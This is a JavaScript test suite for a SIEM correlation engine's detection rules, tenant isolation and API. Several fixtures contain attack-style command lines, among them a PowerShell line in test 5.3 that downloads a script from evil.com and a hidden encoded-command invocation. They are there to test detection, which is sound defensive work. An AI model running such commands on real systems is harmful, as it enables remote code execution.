process.env.NODE_ENV = 'test';
process.env.SKIP_RATE_LIMIT = 'true';
process.env.JWT_SECRET = process.env.JWT_SECRET || 'cyberguard-super-secure-secret-key-32chars!';

const assert = require('assert');
const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');
const { app } = require('../src');
const db = require('../src/config/db');

const correlationRuleEngine = require('../src/services/siem/correlationRuleEngine');
const SiemDetectionRule = require('../src/models/SiemDetectionRule');
const SiemDetectionHit = require('../src/models/SiemDetectionHit');
const EventPipelineService = require('../src/services/siem/eventPipelineService');

let passed = 0;
let failed = 0;

async function testAsync(name, fn) {
  try {
    await fn();
    console.log(`  [✅] ${name}`);
    passed++;
  } catch (err) {
    console.error(`  [❌] ${name}: ${err.message}`);
    failed++;
  }
}

function createToken(user) {
  return jwt.sign(
    {
      id: user.id,
      email: user.email,
      role: user.role,
      organization_id: user.organization_id || null
    },
    process.env.JWT_SECRET,
    { expiresIn: '1h' }
  );
}

async function runTestSuite() {
  console.log('========================================================================');
  console.log('CYBERGUARD — SIEM Phase 2: Correlation & Detection Engine Test Suite');
  console.log('========================================================================\n');

  let server;
  let baseUrl;
  let port;
  let testOrgAId = null;
  let testOrgBId = null;
  let testUserAId = null;
  let testUserBId = null;
  let testEmployeeAId = null;
  let testDeviceAId = null;

  const createdOrgIds = [];
  const createdUserIds = [];
  const createdDeviceIds = [];
  const createdRuleIds = [];

  try {
    // 1. Start ephemeral HTTP server for API controller tests
    await new Promise((resolve) => {
      server = app.listen(0, () => {
        port = server.address().port;
        baseUrl = `http://127.0.0.1:${port}/api/v1`;
        console.log(`[INIT] Test server running on ${baseUrl}\n`);
        resolve();
      });
    });

    // Setup base tenant fixtures
    const orgARes = await db.query(`INSERT INTO public.organizations (name) VALUES ('Correlation Tenant Org A') RETURNING id;`);
    testOrgAId = orgARes.rows[0].id;
    createdOrgIds.push(testOrgAId);

    const orgBRes = await db.query(`INSERT INTO public.organizations (name) VALUES ('Correlation Tenant Org B') RETURNING id;`);
    testOrgBId = orgBRes.rows[0].id;
    createdOrgIds.push(testOrgBId);

    const userARes = await db.query(
      `INSERT INTO public.users (organization_id, email, password_hash, role) VALUES ($1, 'analyst_a@corr.test', 'hash', 'admin') RETURNING id;`,
      [testOrgAId]
    );
    testUserAId = userARes.rows[0].id;
    createdUserIds.push(testUserAId);

    const empARes = await db.query(
      `INSERT INTO public.users (organization_id, email, password_hash, role) VALUES ($1, 'emp_a@corr.test', 'hash', 'employee') RETURNING id;`,
      [testOrgAId]
    );
    testEmployeeAId = empARes.rows[0].id;
    createdUserIds.push(testEmployeeAId);

    const userBRes = await db.query(
      `INSERT INTO public.users (organization_id, email, password_hash, role) VALUES ($1, 'analyst_b@corr.test', 'hash', 'admin') RETURNING id;`,
      [testOrgBId]
    );
    testUserBId = userBRes.rows[0].id;
    createdUserIds.push(testUserBId);

    const devRes = await db.query(
      `INSERT INTO public.devices (organization_id, device_name, is_trusted) VALUES ($1, 'CORP-DC-01', true) RETURNING id;`,
      [testOrgAId]
    );
    testDeviceAId = devRes.rows[0].id;
    createdDeviceIds.push(testDeviceAId);

    const tokenAnalystA = createToken({ id: testUserAId, email: 'analyst_a@corr.test', role: 'analyst', organization_id: testOrgAId });
    const tokenAnalystB = createToken({ id: testUserBId, email: 'analyst_b@corr.test', role: 'analyst', organization_id: testOrgBId });
    const tokenEmployeeA = createToken({ id: testEmployeeAId, email: 'emp_a@corr.test', role: 'employee', organization_id: testOrgAId });
    const tokenNoOrg = createToken({ id: '00000000-0000-0000-0000-000000000099', email: 'no_org@corr.test', role: 'admin', organization_id: null });

    // ──────────────────────────────────────────────────────────────────────────
    // GROUP 1: SCHEMA, MIGRATION & SEED VALIDATION
    // ──────────────────────────────────────────────────────────────────────────
    console.log('--- TEST GROUP 1: SCHEMA, MIGRATION & SEED VALIDATION ---');

    await testAsync('1.1: Migration file 031_siem_detection_rules.sql exists on disk', async () => {
      const migrationPath = path.resolve(__dirname, '../sql/031_siem_detection_rules.sql');
      assert.ok(fs.existsSync(migrationPath), 'Migration 031 file must exist');
      const content = fs.readFileSync(migrationPath, 'utf8');
      assert.ok(content.includes('siem_detection_rules'));
      assert.ok(content.includes('siem_detection_hits'));
    });

    await testAsync('1.2: Tables siem_detection_rules and siem_detection_hits exist in database', async () => {
      const res = await db.query(`
        SELECT table_name FROM information_schema.tables
        WHERE table_schema = 'public' AND table_name IN ('siem_detection_rules', 'siem_detection_hits');
      `);
      const names = res.rows.map(r => r.table_name);
      assert.ok(names.includes('siem_detection_rules'));
      assert.ok(names.includes('siem_detection_hits'));
    });

    await testAsync('1.3: Default system rules (7 templates) are seeded in DB', async () => {
      const rules = await SiemDetectionRule.findByOrg(testOrgAId);
      assert.ok(rules.length >= 7, `Expected at least 7 template rules, found ${rules.length}`);
      const ruleNames = rules.map(r => r.name);
      assert.ok(ruleNames.some(n => n.includes('Brute Force')));
      assert.ok(ruleNames.some(n => n.includes('Password Spray')));
      assert.ok(ruleNames.some(n => n.includes('Privilege Escalation')));
      assert.ok(ruleNames.some(n => n.includes('PowerShell')));
      assert.ok(ruleNames.some(n => n.includes('Audit Log Clearing')));
      assert.ok(ruleNames.some(n => n.includes('Persistence Registry')));
      assert.ok(ruleNames.some(n => n.includes('Beaconing')));
    });

    // ──────────────────────────────────────────────────────────────────────────
    // GROUP 2: RULE 1 — BRUTE FORCE DETECTION (>= 10 failed logins / 5m)
    // ──────────────────────────────────────────────────────────────────────────
    console.log('\n--- TEST GROUP 2: RULE 1 — BRUTE FORCE DETECTION ---');

    await testAsync('2.1: 9 failed logins do NOT trigger Rule 1', async () => {
      correlationRuleEngine.reset();
      const targetUser = 'alice_target';
      let hits = [];

      for (let i = 1; i <= 9; i++) {
        const ev = {
          organization_id: testOrgAId,
          event_type: 'windows_logon_failure',
          normalized_data: { action: 'login_failure', target_user: targetUser }
        };
        hits = await correlationRuleEngine.evaluateEvent(ev, testOrgAId);
      }

      assert.strictEqual(hits.length, 0, '9 failed logins must not trigger Rule 1');
    });

    await testAsync('2.2: 10th failed login triggers Rule 1 with High severity and MITRE T1110', async () => {
      const targetUser = 'alice_target';
      const ev = {
        organization_id: testOrgAId,
        event_type: 'windows_logon_failure',
        normalized_data: { action: 'login_failure', target_user: targetUser }
      };
      const hits = await correlationRuleEngine.evaluateEvent(ev, testOrgAId);

      assert.strictEqual(hits.length, 1);
      const hit = hits[0];
      assert.strictEqual(hit.rule_code, 'SIEM-RULE-BRUTE');
      assert.strictEqual(hit.incident.threat_type, 'account_takeover');
      assert.strictEqual(hit.incident.risk_level, 'high');
      assert.ok(hit.incident.explanation.includes('Brute Force Detection'));

      // Check MITRE mapping
      const mitre = await db.query(`SELECT * FROM public.mitre_mappings WHERE incident_id = $1`, [hit.incident.id]);
      assert.strictEqual(mitre.rows.length, 1);
      assert.strictEqual(mitre.rows[0].technique_id, 'T1110');
    });

    await testAsync('2.3: Different users with 5 failed logins each do NOT trigger Rule 1', async () => {
      correlationRuleEngine.reset();
      let triggered = false;

      for (let i = 1; i <= 5; i++) {
        const h1 = await correlationRuleEngine.evaluateEvent({
          organization_id: testOrgAId,
          event_type: 'windows_logon_failure',
          normalized_data: { action: 'login_failure', target_user: 'user_x' }
        }, testOrgAId);
        const h2 = await correlationRuleEngine.evaluateEvent({
          organization_id: testOrgAId,
          event_type: 'windows_logon_failure',
          normalized_data: { action: 'login_failure', target_user: 'user_y' }
        }, testOrgAId);
        if (h1.length > 0 || h2.length > 0) triggered = true;
      }

      assert.strictEqual(triggered, false, 'Scattered failures across different users must not trigger Rule 1');
    });

    await testAsync('2.4: Rule 1 hit records linked event_ids and creates detection hit in DB', async () => {
      correlationRuleEngine.reset();
      const fakeEventId = '11111111-1111-1111-1111-111111111111';
      let lastHit = null;

      for (let i = 1; i <= 10; i++) {
        const hits = await correlationRuleEngine.evaluateEvent({
          id: fakeEventId,
          organization_id: testOrgAId,
          event_type: 'windows_logon_failure',
          normalized_data: { action: 'login_failure', target_user: 'victim_boxed' }
        }, testOrgAId);
        if (hits.length > 0) lastHit = hits[0];
      }

      assert.ok(lastHit);
      assert.ok(lastHit.hit);
      assert.strictEqual(lastHit.hit.organization_id, testOrgAId);
      assert.strictEqual(lastHit.hit.event_ids.length, 10);
      assert.ok(lastHit.hit.event_ids.includes(fakeEventId));
    });

    // ──────────────────────────────────────────────────────────────────────────
    // GROUP 3: RULE 2 — PASSWORD SPRAYING (>= 10 distinct users / same IP / 15m)
    // ──────────────────────────────────────────────────────────────────────────
    console.log('\n--- TEST GROUP 3: RULE 2 — PASSWORD SPRAYING ---');

    await testAsync('3.1: 9 distinct users from same IP do NOT trigger Rule 2', async () => {
      correlationRuleEngine.reset();
      const sourceIp = '198.51.100.99';
      let hits = [];

      for (let i = 1; i <= 9; i++) {
        hits = await correlationRuleEngine.evaluateEvent({
          organization_id: testOrgAId,
          event_type: 'windows_logon_failure',
          normalized_data: { action: 'login_failure', source_ip: sourceIp, target_user: `spray_user_${i}` }
        }, testOrgAId);
      }

      assert.strictEqual(hits.length, 0, '9 users must not trigger Rule 2');
    });

    await testAsync('3.2: 10th distinct user from same IP triggers Rule 2 with MITRE T1110.003', async () => {
      const sourceIp = '198.51.100.99';
      const hits = await correlationRuleEngine.evaluateEvent({
        organization_id: testOrgAId,
        event_type: 'windows_logon_failure',
        normalized_data: { action: 'login_failure', source_ip: sourceIp, target_user: 'spray_user_10' }
      }, testOrgAId);

      assert.strictEqual(hits.length, 1);
      const hit = hits[0];
      assert.strictEqual(hit.rule_code, 'SIEM-RULE-SPRAY');
      assert.strictEqual(hit.incident.threat_type, 'account_takeover');
      assert.strictEqual(hit.incident.risk_level, 'high');
      assert.ok(hit.incident.explanation.includes('Password Spray'));

      // Check MITRE mapping
      const mitre = await db.query(`SELECT * FROM public.mitre_mappings WHERE incident_id = $1`, [hit.incident.id]);
      assert.strictEqual(mitre.rows.length, 1);
      assert.strictEqual(mitre.rows[0].technique_id, 'T1110.003');
    });

    await testAsync('3.3: Same user logging in 10 times from same IP does NOT trigger Rule 2', async () => {
      correlationRuleEngine.reset();
      let triggeredSpray = false;
      const sourceIp = '198.51.100.12';

      for (let i = 1; i <= 10; i++) {
        const hits = await correlationRuleEngine.evaluateEvent({
          organization_id: testOrgAId,
          event_type: 'windows_logon_failure',
          normalized_data: { action: 'login_failure', source_ip: sourceIp, target_user: 'single_account_only' }
        }, testOrgAId);
        if (hits.some(h => h.rule_code === 'SIEM-RULE-SPRAY')) triggeredSpray = true;
      }

      assert.strictEqual(triggeredSpray, false, 'Rule 2 requires distinct users');
    });

    // ──────────────────────────────────────────────────────────────────────────
    // GROUP 4: RULE 3 — PRIVILEGE ESCALATION SEQUENCE (Login + Admin Group / 30m)
    // ──────────────────────────────────────────────────────────────────────────
    console.log('\n--- TEST GROUP 4: RULE 3 — PRIVILEGE ESCALATION SEQUENCE ---');

    await testAsync('4.1: Admin group addition without preceding login does NOT trigger Rule 3', async () => {
      correlationRuleEngine.reset();
      const hits = await correlationRuleEngine.evaluateEvent({
        organization_id: testOrgAId,
        event_type: 'windows_local_group_member_added',
        normalized_data: { action: 'privilege_escalation', target_user: 'standalone_user' }
      }, testOrgAId);

      assert.strictEqual(hits.length, 0);
    });

    await testAsync('4.2: Successful login followed by admin group addition triggers Rule 3 with Critical severity', async () => {
      correlationRuleEngine.reset();
      const targetUser = 'charlie_escalator';

      // Stage 1: Login
      const loginHits = await correlationRuleEngine.evaluateEvent({
        organization_id: testOrgAId,
        event_type: 'windows_logon_success',
        normalized_data: { action: 'logon', target_user: targetUser }
      }, testOrgAId);
      assert.strictEqual(loginHits.length, 0);

      // Stage 2: Admin group addition
      const escHits = await correlationRuleEngine.evaluateEvent({
        organization_id: testOrgAId,
        event_type: 'windows_local_group_member_added',
        normalized_data: { action: 'privilege_escalation', target_user: targetUser }
      }, testOrgAId);

      assert.strictEqual(escHits.length, 1);
      const hit = escHits[0];
      assert.strictEqual(hit.rule_code, 'SIEM-RULE-PRV');
      assert.strictEqual(hit.incident.threat_type, 'account_takeover');
      assert.strictEqual(hit.incident.risk_level, 'critical');
      assert.ok(hit.incident.explanation.includes('Privilege Escalation'));

      // Check MITRE mapping
      const mitre = await db.query(`SELECT * FROM public.mitre_mappings WHERE incident_id = $1`, [hit.incident.id]);
      assert.strictEqual(mitre.rows.length, 1);
      assert.strictEqual(mitre.rows[0].technique_id, 'T1068');
    });

    await testAsync('4.3: Login for User X followed by admin group addition for User Y does NOT trigger Rule 3', async () => {
      correlationRuleEngine.reset();

      await correlationRuleEngine.evaluateEvent({
        organization_id: testOrgAId,
        event_type: 'windows_logon_success',
        normalized_data: { action: 'logon', target_user: 'user_one' }
      }, testOrgAId);

      const hits = await correlationRuleEngine.evaluateEvent({
        organization_id: testOrgAId,
        event_type: 'windows_local_group_member_added',
        normalized_data: { action: 'privilege_escalation', target_user: 'user_two' }
      }, testOrgAId);

      assert.strictEqual(hits.length, 0, 'Must match on same target user');
    });

    await testAsync('4.4: Sequence state is cleared upon match (idempotency)', async () => {
      // Second admin group addition without another login should not re-trigger
      const hits = await correlationRuleEngine.evaluateEvent({
        organization_id: testOrgAId,
        event_type: 'windows_local_group_member_added',
        normalized_data: { action: 'privilege_escalation', target_user: 'charlie_escalator' }
      }, testOrgAId);

      assert.strictEqual(hits.length, 0, 'Sequence state must be consumed on match');
    });

    // ──────────────────────────────────────────────────────────────────────────
    // GROUP 5: RULES 4, 5, 6 — SINGLE-EVENT & PATTERN RULES
    // ──────────────────────────────────────────────────────────────────────────
    console.log('\n--- TEST GROUP 5: RULES 4, 5, 6 — SINGLE-EVENT & PATTERN RULES ---');

    await testAsync('5.1: Rule 4: Normal powershell.exe command does NOT trigger', async () => {
      const hits = await correlationRuleEngine.evaluateEvent({
        organization_id: testOrgAId,
        event_type: 'sysmon_process_creation',
        normalized_data: {
          process_name: 'powershell.exe',
          command_line: 'powershell.exe Get-Date'
        }
      }, testOrgAId);

      assert.strictEqual(hits.filter(h => h.rule_code === 'SIEM-RULE-PWSH').length, 0);
    });

    await testAsync('5.2: Rule 4: powershell.exe with -encodedcommand triggers Rule 4 (MITRE T1059)', async () => {
      const hits = await correlationRuleEngine.evaluateEvent({
        organization_id: testOrgAId,
        event_type: 'sysmon_process_creation',
        normalized_data: {
          process_name: 'powershell.exe',
          command_line: 'powershell.exe -NoP -NonI -W Hidden -EncodedCommand SQBFAFgAIAA...'
        }
      }, testOrgAId);

      assert.strictEqual(hits.length, 1);
      const hit = hits[0];
      assert.strictEqual(hit.rule_code, 'SIEM-RULE-PWSH');
      assert.strictEqual(hit.incident.threat_type, 'technical_threat');
      assert.strictEqual(hit.incident.risk_level, 'high');
      assert.ok(hit.incident.explanation.includes('PowerShell Abuse'));

      // Check MITRE mapping
      const mitre = await db.query(`SELECT * FROM public.mitre_mappings WHERE incident_id = $1`, [hit.incident.id]);
      assert.strictEqual(mitre.rows.length, 1);
      assert.strictEqual(mitre.rows[0].technique_id, 'T1059');
    });

    await testAsync('5.3: Rule 4: powershell.exe with downloadstring triggers Rule 4', async () => {
      const hits = await correlationRuleEngine.evaluateEvent({
        organization_id: testOrgAId,
        event_type: 'sysmon_process_creation',
        normalized_data: {
          process_name: 'powershell.exe',
          command_line: 'powershell.exe (New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")'
        }
      }, testOrgAId);

      assert.strictEqual(hits.length, 1);
      assert.strictEqual(hits[0].rule_code, 'SIEM-RULE-PWSH');
    });

    await testAsync('5.4: Rule 5: Windows Event 1102 triggers Critical incident and MITRE T1070', async () => {
      const hits = await correlationRuleEngine.evaluateEvent({
        organization_id: testOrgAId,
        event_id: '1102',
        event_type: 'windows_audit_log_cleared',
        normalized_data: {
          event_id: '1102',
          action: 'audit_log_cleared',
          target_host: 'SEC-DC-01'
        }
      }, testOrgAId);

      assert.strictEqual(hits.length, 1);
      const hit = hits[0];
      assert.strictEqual(hit.rule_code, 'SIEM-RULE-LOGCLEAR');
      assert.strictEqual(hit.incident.threat_type, 'technical_threat');
      assert.strictEqual(hit.incident.risk_level, 'critical');
      assert.ok(hit.incident.explanation.includes('Audit Log Clearing'));

      // Check MITRE mapping
      const mitre = await db.query(`SELECT * FROM public.mitre_mappings WHERE incident_id = $1`, [hit.incident.id]);
      assert.strictEqual(mitre.rows.length, 1);
      assert.strictEqual(mitre.rows[0].technique_id, 'T1070');
    });

    await testAsync('5.5: Rule 6: Normal registry query does not trigger Rule 6', async () => {
      const hits = await correlationRuleEngine.evaluateEvent({
        organization_id: testOrgAId,
        event_type: 'sysmon_registry_event',
        normalized_data: {
          registry_key: 'HKLM\\System\\CurrentControlSet\\Control\\TimeZoneInformation'
        }
      }, testOrgAId);

      assert.strictEqual(hits.filter(h => h.rule_code === 'SIEM-RULE-REG').length, 0);
    });

    await testAsync('5.6: Rule 6: Modification of Run key triggers High severity incident and MITRE T1547', async () => {
      const hits = await correlationRuleEngine.evaluateEvent({
        organization_id: testOrgAId,
        event_type: 'sysmon_registry_event',
        normalized_data: {
          registry_key: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\BackdoorPersistence',
          process_name: 'cmd.exe'
        }
      }, testOrgAId);

      assert.strictEqual(hits.length, 1);
      const hit = hits[0];
      assert.strictEqual(hit.rule_code, 'SIEM-RULE-REG');
      assert.strictEqual(hit.incident.threat_type, 'technical_threat');
      assert.strictEqual(hit.incident.risk_level, 'high');
      assert.ok(hit.incident.explanation.includes('Persistence Registry Modification'));

      // Check MITRE mapping
      const mitre = await db.query(`SELECT * FROM public.mitre_mappings WHERE incident_id = $1`, [hit.incident.id]);
      assert.strictEqual(mitre.rows.length, 1);
      assert.strictEqual(mitre.rows[0].technique_id, 'T1547');
    });

    // ──────────────────────────────────────────────────────────────────────────
    // GROUP 6: RULE 7 — SUSPICIOUS BEACONING (>= 20 connections / 1h)
    // ──────────────────────────────────────────────────────────────────────────
    console.log('\n--- TEST GROUP 6: RULE 7 — SUSPICIOUS BEACONING ---');

    await testAsync('6.1: 19 network connections to same destination do NOT trigger Rule 7', async () => {
      correlationRuleEngine.reset();
      const dest = '185.220.101.5';
      let hits = [];

      for (let i = 1; i <= 19; i++) {
        hits = await correlationRuleEngine.evaluateEvent({
          organization_id: testOrgAId,
          event_type: 'sysmon_network_connection',
          normalized_data: { dest_ip: dest, dest_port: 443 }
        }, testOrgAId);
      }

      assert.strictEqual(hits.length, 0, '19 connections must not trigger Rule 7');
    });

    await testAsync('6.2: 20th connection triggers Rule 7 with Medium severity and MITRE T1071', async () => {
      const dest = '185.220.101.5';
      const hits = await correlationRuleEngine.evaluateEvent({
        organization_id: testOrgAId,
        event_type: 'sysmon_network_connection',
        normalized_data: { dest_ip: dest, dest_port: 443 }
      }, testOrgAId);

      assert.strictEqual(hits.length, 1);
      const hit = hits[0];
      assert.strictEqual(hit.rule_code, 'SIEM-RULE-BEACON');
      assert.strictEqual(hit.incident.threat_type, 'technical_threat');
      assert.strictEqual(hit.incident.risk_level, 'medium');
      assert.ok(hit.incident.explanation.includes('Suspicious Beaconing'));

      // Check MITRE mapping
      const mitre = await db.query(`SELECT * FROM public.mitre_mappings WHERE incident_id = $1`, [hit.incident.id]);
      assert.strictEqual(mitre.rows.length, 1);
      assert.strictEqual(mitre.rows[0].technique_id, 'T1071');
    });

    await testAsync('6.3: Distributed connections to 20 different destinations do NOT trigger Rule 7', async () => {
      correlationRuleEngine.reset();
      let triggered = false;

      for (let i = 1; i <= 20; i++) {
        const hits = await correlationRuleEngine.evaluateEvent({
          organization_id: testOrgAId,
          event_type: 'sysmon_network_connection',
          normalized_data: { dest_ip: `10.0.0.${i}`, dest_port: 80 }
        }, testOrgAId);
        if (hits.length > 0) triggered = true;
      }

      assert.strictEqual(triggered, false, 'Beaconing requires repeated connections to same destination');
    });

    // ──────────────────────────────────────────────────────────────────────────
    // GROUP 7: MULTI-TENANT ISOLATION & RBAC SECURITY
    // ──────────────────────────────────────────────────────────────────────────
    console.log('\n--- TEST GROUP 7: MULTI-TENANT ISOLATION & RBAC SECURITY ---');

    await testAsync('7.1: Cross-tenant isolation: Org B events do not contribute to Org A thresholds', async () => {
      correlationRuleEngine.reset();
      const user = 'shared_username';

      // 8 failed logins in Org A
      for (let i = 1; i <= 8; i++) {
        await correlationRuleEngine.evaluateEvent({
          organization_id: testOrgAId,
          event_type: 'windows_logon_failure',
          normalized_data: { action: 'login_failure', target_user: user }
        }, testOrgAId);
      }

      // 8 failed logins in Org B
      for (let i = 1; i <= 8; i++) {
        const hits = await correlationRuleEngine.evaluateEvent({
          organization_id: testOrgBId,
          event_type: 'windows_logon_failure',
          normalized_data: { action: 'login_failure', target_user: user }
        }, testOrgBId);
        assert.strictEqual(hits.length, 0, 'Org B threshold should be independent');
      }

      // Check Org A still needs 2 more to trigger
      const hitsA = await correlationRuleEngine.evaluateEvent({
        organization_id: testOrgAId,
        event_type: 'windows_logon_failure',
        normalized_data: { action: 'login_failure', target_user: user }
      }, testOrgAId);
      assert.strictEqual(hitsA.length, 0, '9th event in Org A must not trigger yet');
    });

    await testAsync('7.2: Org B user cannot view Org A detection hits via API', async () => {
      // First query detections as Org B
      const res = await fetch(`${baseUrl}/siem/detections`, {
        headers: { Authorization: `Bearer ${tokenAnalystB}` }
      });
      assert.strictEqual(res.status, 200);
      const json = await res.json();
      assert.strictEqual(json.data.length, 0, 'Org B should see 0 detections from Org A');
    });

    await testAsync('7.3: Reject unauthenticated requests to detection endpoints with 401', async () => {
      const res1 = await fetch(`${baseUrl}/siem/detections`);
      assert.strictEqual(res1.status, 401);

      const res2 = await fetch(`${baseUrl}/siem/rules`);
      assert.strictEqual(res2.status, 401);
    });

    await testAsync('7.4: Reject non-analyst/admin role (employee) with 403 Forbidden', async () => {
      const res1 = await fetch(`${baseUrl}/siem/detections`, {
        headers: { Authorization: `Bearer ${tokenEmployeeA}` }
      });
      assert.strictEqual(res1.status, 403);

      const res2 = await fetch(`${baseUrl}/siem/rules`, {
        headers: { Authorization: `Bearer ${tokenEmployeeA}` }
      });
      assert.strictEqual(res2.status, 403);
    });

    await testAsync('7.5: Reject requests with null/missing organization_id with 403 Forbidden', async () => {
      const res = await fetch(`${baseUrl}/siem/detections`, {
        headers: { Authorization: `Bearer ${tokenNoOrg}` }
      });
      assert.strictEqual(res.status, 403);
    });

    // ──────────────────────────────────────────────────────────────────────────
    // GROUP 8: API SURFACE, SLIDING WINDOWS & AUDIT LOGGING
    // ──────────────────────────────────────────────────────────────────────────
    console.log('\n--- TEST GROUP 8: API SURFACE, SLIDING WINDOWS & AUDIT LOGGING ---');

    await testAsync('8.1: GET /api/v1/siem/detections returns paginated hits with total', async () => {
      const res = await fetch(`${baseUrl}/siem/detections`, {
        headers: { Authorization: `Bearer ${tokenAnalystA}` }
      });
      assert.strictEqual(res.status, 200);
      const json = await res.json();
      assert.ok(Array.isArray(json.data));
      assert.ok(json.data.length > 0, 'Org A should have detection hits');
      assert.ok(json.pagination);
      assert.ok(json.pagination.total >= json.data.length);
    });

    await testAsync('8.2: GET /api/v1/siem/detections/:id returns full detection hit details', async () => {
      const listRes = await fetch(`${baseUrl}/siem/detections`, {
        headers: { Authorization: `Bearer ${tokenAnalystA}` }
      });
      const listJson = await listRes.json();
      const firstHitId = listJson.data[0].id;

      const res = await fetch(`${baseUrl}/siem/detections/${firstHitId}`, {
        headers: { Authorization: `Bearer ${tokenAnalystA}` }
      });
      assert.strictEqual(res.status, 200);
      const json = await res.json();
      assert.strictEqual(json.data.id, firstHitId);
      assert.ok(json.data.rule_name);
    });

    await testAsync('8.3: GET /api/v1/siem/rules returns active rules for tenant', async () => {
      const res = await fetch(`${baseUrl}/siem/rules`, {
        headers: { Authorization: `Bearer ${tokenAnalystA}` }
      });
      assert.strictEqual(res.status, 200);
      const json = await res.json();
      assert.ok(json.data.length >= 7);
    });

    await testAsync('8.4: POST /api/v1/siem/rules creates custom detection rule and records audit log', async () => {
      const newRulePayload = {
        name: 'Custom Web Shell Detector',
        description: 'Detects execution of whoami right after file upload in web directories',
        severity: 'critical',
        rule_type: 'sequence',
        conditions: {
          trigger: 'web_shell_execution'
        }
      };

      const res = await fetch(`${baseUrl}/siem/rules`, {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${tokenAnalystA}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(newRulePayload)
      });

      assert.strictEqual(res.status, 201);
      const json = await res.json();
      assert.ok(json.data.id);
      createdRuleIds.push(json.data.id);
      assert.strictEqual(json.data.name, newRulePayload.name);

      // Verify audit log
      const auditRes = await db.query(
        `SELECT * FROM public.audit_logs WHERE action = 'SIEM_RULE_CREATED' AND resource_id = $1`,
        [json.data.id]
      );
      assert.strictEqual(auditRes.rows.length, 1);
    });

    await testAsync('8.5: PATCH /api/v1/siem/rules/:id updates rule state and records audit log', async () => {
      const ruleId = createdRuleIds[0];
      const res = await fetch(`${baseUrl}/siem/rules/${ruleId}`, {
        method: 'PATCH',
        headers: {
          Authorization: `Bearer ${tokenAnalystA}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ enabled: false, severity: 'high' })
      });

      assert.strictEqual(res.status, 200);
      const json = await res.json();
      assert.strictEqual(json.data.enabled, false);
      assert.strictEqual(json.data.severity, 'high');

      // Verify audit log
      const auditRes = await db.query(
        `SELECT * FROM public.audit_logs WHERE action = 'SIEM_RULE_UPDATED' AND resource_id = $1`,
        [ruleId]
      );
      assert.strictEqual(auditRes.rows.length, 1);
    });

    await testAsync('8.6: End-to-end pipeline ingestion processes events through correlation engine', async () => {
      correlationRuleEngine.reset();
      const pipelineEvents = [];
      for (let i = 1; i <= 10; i++) {
        pipelineEvents.push({
          EventID: '4625',
          EventData: {
            TargetUserName: 'pipeline_victim',
            IpAddress: '10.20.30.40'
          }
        });
      }

      const res = await EventPipelineService.processEvents({
        organizationId: testOrgAId,
        events: pipelineEvents
      });

      assert.strictEqual(res.total_events, 10);
      assert.strictEqual(res.successful_events, 10);
      assert.ok(res.detected_incidents.length > 0, 'Must create incident via correlation rule engine');
      const bruteHit = res.detected_incidents.find(i => i.rule_id === 'SIEM-RULE-BRUTE');
      assert.ok(bruteHit, 'Pipeline must trigger SIEM-RULE-BRUTE');
    });

  } finally {
    console.log('\n--- CLEANUP FIXTURES ---');
    if (server) {
      server.close();
    }
    try {
      if (createdRuleIds.length > 0) {
        await db.query(`DELETE FROM public.siem_detection_rules WHERE id = ANY($1::uuid[]);`, [createdRuleIds]);
      }
      if (createdDeviceIds.length > 0) {
        await db.query(`DELETE FROM public.devices WHERE id = ANY($1::uuid[]);`, [createdDeviceIds]);
      }
      if (createdUserIds.length > 0) {
        await db.query(`DELETE FROM public.users WHERE id = ANY($1::uuid[]);`, [createdUserIds]);
      }
      if (createdOrgIds.length > 0) {
        await db.query(`DELETE FROM public.siem_detection_hits WHERE organization_id = ANY($1::uuid[]);`, [createdOrgIds]);
        await db.query(`DELETE FROM public.incidents WHERE organization_id = ANY($1::uuid[]);`, [createdOrgIds]);
        await db.query(`DELETE FROM public.security_events WHERE organization_id = ANY($1::uuid[]);`, [createdOrgIds]);
        await db.query(`DELETE FROM public.event_ingestion_jobs WHERE organization_id = ANY($1::uuid[]);`, [createdOrgIds]);
        await db.query(`DELETE FROM public.audit_logs WHERE organization_id = ANY($1::uuid[]);`, [createdOrgIds]);
        await db.query(`DELETE FROM public.organizations WHERE id = ANY($1::uuid[]);`, [createdOrgIds]);
      }
      console.log('  [✅] Test fixtures cleaned up successfully');
    } catch (cleanupErr) {
      console.error('  [⚠️] Cleanup warning:', cleanupErr.message);
    }
  }

  console.log('\n========================================================================');
  console.log(`RESULTS: ${passed} PASSED, ${failed} FAILED`);
  console.log('========================================================================');

  if (failed > 0) {
    process.exit(1);
  } else {
    process.exit(0);
  }
}

runTestSuite().catch((err) => {
  console.error('Fatal Test Error:', err);
  process.exit(1);
});
